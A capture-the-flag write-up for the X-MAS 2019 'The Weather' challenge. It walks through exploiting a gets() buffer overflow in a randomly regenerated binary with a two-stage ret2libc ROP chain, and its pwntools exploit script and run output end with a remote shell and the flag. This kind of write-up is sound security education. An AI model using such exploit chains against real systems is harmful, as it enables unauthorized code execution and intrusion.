# The Weather

> Binary Exploitation 
--------------------

## Problem Statement
> Software is like the weather, it's always changing  
> **Connect using: nc challs.xmas.htsp.ro 12002**  
> **Files:** [Docker](./Dockerfile)

## Analysis

In this challenge we were just given a netcat connection and a docker file<br>
* Let's Try to read the Docker file
    >```shell
    >viperx7@computer $  cat Docker
    >FROM ubuntu:18.04
    ># [REDACTED]
    >``````
    > This might be a hint to what operating system they are using on the server
* Now let's see what do we get when we try to connect to the server  
    >```shell
    >viperx7@computer $  ./connect.sh
    >Contents:b'50m3Rand0mch4rac73rsh3r3''
    >The weather is so unpredictable... Let me give you a binary to play with
    >
    >What's your name? ViperX7
    >Nice to meet you, ViperX7!
    >See ya!
    >Bye
    >```
    >The Outbut above is not the real output the actual output was too large but if you are curious`  
    >I have 3 dumps of outputs from the actual challenge  that you can look at
    > * [dump1](./Dumps/dump1)
    > * [dump2](./Dumps/dump2)
    > * [dump3](./Dumps/dump3)  

* The connection script basically prints out a large string saying it's a binary
    > It looks like base 64 encoded string  
    > So i quickly wrote a script that will convert the base64 string into data and saves it to disk  

* [**save2disk.py**](./save2disk.py)
    >```python
    >import pwn
    >import base64
    >pwn.context.arch = 'amd64'
    >
    >host, port = 'challs.xmas.htsp.ro', 12002
    >
    >conn = pwn.remote(host, port)
    >conn.recvuntil("Content: b'")
    >encoded_bin = conn.recvuntil('\n\n\n').decode('utf-8').strip('\n').strip("'")
    >print(encoded_bin)
    >binary = base64.decodebytes(encoded_bin.encode())
    >
    >file = open('binary','wb')
    >file.write(binary)
    >file.close()
    >```


* Let's Check the binary
    >```shell
    >viperx7@computer $ checksec binary
    >[*] '/home/utkarsh/ctfs/CTF_Writeups/2019/x-mas_ctf/Binary Exploitation/the_weather/binary'
    >    Arch:     amd64-64-little
    >    RELRO:    Partial RELRO
    >    Stack:    No canary found
    >    NX:       NX enabled
    >    PIE:      No PIE (0x400000)
    >
    >viperx7@computer $ file binary
    >binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
    >BuildID[sha1]=af2a272af086cde5931e9e2fe15b229ca8b1cf6b, stripped
    >```
    >#### Things To Notice
    >* **stripped**
    >* **NX enabled**
    >* **Dynamically Linked**

    >`After Some test Runs It's clear that the binary running on the server is not the same`


* Now each time we run the above script we get a different binary but they all do similar thing
    >At this point it is safe to assume that everytime we connect the server,
    > it compiles a new binary send us the binary as base64 and at the end runs
    > the same binary on the server and we can interact with it


* At this stage it will be a lot better to use a disassembler than a debugger
    > Let's use ghidra to get an idea about how the sourcecode may have looked like
    > The binary is stripped so you wont find any direct main function
    > To get to the main function just go to the entry point and double click
    > the first function you see

    * Sample disassembly 1
        ```c
            undefined8 FUN_00401e12(void)

            {
                char local_a8 [160];

                setvbuf(stdin,(char *)0x0,2,0);
                setvbuf(stdout,(char *)0x0,2,0);
                signal(0xe,FUN_00400717);
                alarm(0x1e);
                FUN_00400d34();
                FUN_00400e11();
                FUN_00401be3();
                FUN_00401c4a();
                printf("What\'s your name? ");
                gets(local_a8);
                printf("Welcome, %s!\n",local_a8);
                puts("See ya!");
                return 0;
            }
        ```
    * Sample Disassembly 2
        ```c
            undefined8 FUN_00403952(void)

            {
                char local_68 [96];

                setvbuf(stdin,(char *)0x0,2,0);
                setvbuf(stdout,(char *)0x0,2,0);
                signal(0xe,FUN_00400717);
                alarm(0x1e);
                FUN_0040107f();
                FUN_004010ea();
                FUN_0040111e();
                FUN_00401125();
                FUN_00401133();
                FUN_00401141();
                FUN_004011aa();
                FUN_00401272();
                FUN_004012a3();
                FUN_00401346();
                FUN_00401b67();
                FUN_00401c0c();
                FUN_00401cb3();
                printf("What\'s your name? ");
                gets(local_68);
                printf("Good day, %s!\n",local_68);
                puts("Good bye!");
                return 0;
            }
        ```

* I trimmed both sources a little bit but you these two you can clearly makeout the difference 
    >Things that are changing  
    > * The size of buffer is changing
    > * Addresses of everything changes

* Now lets take a close look we have a gets call and no bount check is in place
    > So we have a bufferoverflow 


## Solution

* Loadout `What do we have` 

                                        We have a buffer overflow
                                 Operating System in use Ubuntu 18.04
* Restrictionns

                                      No shellcode can be used (NX Enabled)
                                   Size of Buffer is different everytime we connect

* Target `what do we want` 

                                    We want a shell so that we can read the flag

* Plan

                                        Get the appropriate libc(libc-2.27.so)
                                                Connect to server
                                      Save the binary from the connection output
                                                find the buffersize
                                              find the address of main
                                                leak some address
                                               get /bin/sh from libc
                                          find address of system from libc
                                            call /bin/sh using system


## Exploit
> Get the exploit script  used below [here](./express_ploit.py)

* Preparation 
    ```python
        #!/bin/env python3
        from pwn import *
        import os
        import sys
        import subprocess

        # set the architecture we are working with
        context.arch = 'amd64'
    ```

* Get the binary or initialise the connection

    ```python
        # Determine the exploit location remote or local
        if len(sys.argv) > 1 and sys.argv[1] == 'remote':
              rem = True
        else:
            rem = False

        if rem:                         # remote exploit code

            # initialise connection
            host, port = 'challs.xmas.htsp.ro', 12002
            p = remote(host, port)

            # get the binary from output
            p.recvuntil("Content: b'")
            encoded_bin = p.recvuntil('\n\n\n\n').decode('utf-8').strip('\n').strip("'")
            binary = base64.decodebytes(encoded_bin.encode())

            # save the binary and set correct permission
            file = open('binary', 'wb')
            file.write(binary)
            file.close()
            os.system('chmod +x ./binary')

        else:                           # local exploit code
            # run the binary
            p = process('./binary')
    ```



* Load requirements for leaking the address
    ```python
        # open the binary
        binary = ELF('./binary')

        # Get the gadgets
        pop_rdi = p64(next(binary.search(asm('pop rdi; ret'))))
        ret = p64(next(binary.search(asm('ret'))))

        # get the addresses of puts_plt and puts_got from the binary
        puts_got = p64(binary.got['puts'])
        puts_plt = p64(binary.plt['puts'])
    ```

* Now to exploit the buffer overflow we need the address of main and size of
buffer 

    > I wrote a small bash snippet that uses gdb to extract address and buffer size [**tec.sh**](./tec.sh)

    `Lets call the helper script and get the address and  buffer size`  

    ```python
        # Call the helper script
        main,buff_size = subprocess.check_output('./tec.sh',shell=True).decode('utf-8').strip('\n').split('\n')
        main = p64(int(main, 16))
        buff_size = int(buff_size, 16)
    ```

* Now we are ready to exploit the binary 
    > **Note**: We have to send the address of main at the end that will cause the program to execute main once again and we can then send another payload.
    ```python
        # Prepare padding for our exploit
        offset = b'A'*buff_size + b'8bytJUNK'
        payload = offset + pop_rdi + puts_got + puts_plt + main
    ```
* Lets send our payload 
    ```python
        p.recvuntil('?')
        p.sendline( payload )
        p.recvline()
        p.recvline()
        leak = p.recvline()
        leaked_puts = u64(leak[:-1] + b'\x00\x00')
    ```

* Now that we have leaked the puts lets find libc base address and stuff we need
    ```python
        libc = ELF('./libc-2.27.so')

        # Search the puts and system offset in selected libc
        libc_puts_offset = libc.symbols['puts']
        libc_system_offset = libc.symbols['system']

        # Calculate libc base address
        lba = leaked_puts - libc_puts_offset
        log.success("Libc base address: " + hex(lba))

        # Calculate address of system and binsh string in current process
        system = p64(lba + libc_system_offset)
        bin_sh = p64(next(libc.search(b'/bin/sh')) + lba)
    ```

* Now finally our second payload looks like
    ```python
        payload = offset + ret + pop_rdi + bin_sh + system
    ```

* At last lets send the payload and get the shell
    ```python
        p.recvuntil('?')
        p.sendline(payload)
        p.recvline()
        p.recvline()
        p.interactive()
    ```


## Flag
* Lets run the [script](./express_ploit.py)
    ```shell
        viperx7@computer $ python express_ploit.py remote
        [+] Opening connection to challs.xmas.htsp.ro on port 12002: Done
        [*] '/home/utkarsh/ctfs/CTF_Writeups/2019/x-mas_ctf/Pwn/the_weather/binary'
            Arch:     amd64-64-little
            RELRO:    Partial RELRO
            Stack:    No canary found
            NX:       NX enabled
            PIE:      No PIE (0x400000)
        [+] puts leaked at :0x7faa074169c0
        [*] '/home/utkarsh/ctfs/CTF_Writeups/2019/x-mas_ctf/Pwn/the_weather/libc-2.27.so'
            Arch:     amd64-64-little
            RELRO:    Partial RELRO
            Stack:    Canary found
            NX:       NX enabled
            PIE:      PIE enabled
        [+] Libc base address: 0x7faa07396000
        [*] Switching to interactive mode
        $ ls
        bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
        $ cd home
        $ ls
        ctf
        $ cd ctf
        $ ls
        bin chall dev flag.txt generator.py lib lib64 template.c 
        $ cat flag.txt
        X-MAS{0h_1_7h1nk_y0u_4r3_4_r0b07}
        Timeout...
        Bye
        $  
    ```

flag: `X-MAS{0h_1_7h1nk_y0u_4r3_4_r0b07}`
